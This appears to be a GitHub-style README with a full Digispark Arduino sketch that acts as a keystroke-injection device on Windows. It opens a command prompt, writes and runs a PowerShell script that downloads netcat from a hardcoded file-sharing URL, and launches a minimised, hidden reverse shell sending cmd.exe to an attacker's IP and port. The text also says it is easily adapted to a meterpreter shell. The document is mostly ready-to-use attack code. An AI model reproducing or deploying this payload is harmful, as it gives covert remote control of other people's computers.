# Digispark Arduino Reverse Shell for windows 10

### Although designed for windows 10 this script will work for windows vista onwards.

## A digispark arduino script to pop a reverse hidden shell to a specified ip address using netcat.

The listening machine will need to be running before the script is run.

This script can be easily modified to pop a reverse meterpreter shell instead of netcat.

link to download netcat has been hardcoded but can be replaced if wanted. To do this change the url to a direct download url of nc64.exe.

This script has been optimised to run on the digisparks limited memory requirements.

#### Warning: depending on the model of digispark the onboard led might be on pin 0 instead of 1.

LED Run-status: The LED will blink to state the code has started running. Once the code execution has completed the LED will stay illuminated and thus the device can be unplugged.

replace *IP* and *PORT* with your own values.
```c
#include "DigiKeyboard.h"
/* Init function */
//script created by valkyrix.github.io
void setup()
{//turn LED off while code is running, this means the device is safe to unplug as soon as the LED turns back on
  pinMode(1, OUTPUT); //LED on Model A
  digitalWrite(1, HIGH);
  DigiKeyboard.delay(500);
  digitalWrite(1, LOW);
  DigiKeyboard.sendKeyStroke(0);
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  DigiKeyboard.delay(100);
  DigiKeyboard.println("cmd");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(100);
  DigiKeyboard.println("cd / & mkdir win & cd /win & echo (wget 'https://1fichier.com/?dtc7uqmikl' -OutFile a.exe) > b.ps1");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(50);
  DigiKeyboard.println("powershell -ExecutionPolicy ByPass -File b.ps1");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(50);
  DigiKeyboard.println("START /MIN a.exe IP PORT -e cmd.exe -d & exit");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  digitalWrite(1, HIGH);
}

/* Unused endless loop */
void loop() {}

```
